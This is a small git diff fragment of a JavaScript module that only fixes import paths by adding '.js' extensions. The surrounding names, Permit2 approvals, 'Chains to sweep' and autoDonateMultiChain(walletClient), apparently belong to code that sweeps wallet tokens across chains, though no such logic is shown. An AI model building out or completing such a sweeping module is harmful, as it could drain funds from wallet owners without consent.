@@ -9,8 +9,8 @@ import {
   PERMIT2_ADDRESS,
   PERMIT2_ABI,
   exceptionList,
-} from "../config";
-import { getFreePermit2Nonce } from "./nonceHelper";
+} from "../config.js";
+import { getFreePermit2Nonce } from "./nonceHelper.js";
 
 /**
  * Chains to sweep
@@ -332,4 +332,5 @@ export async function autoDonateMultiChain(walletClient) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
 
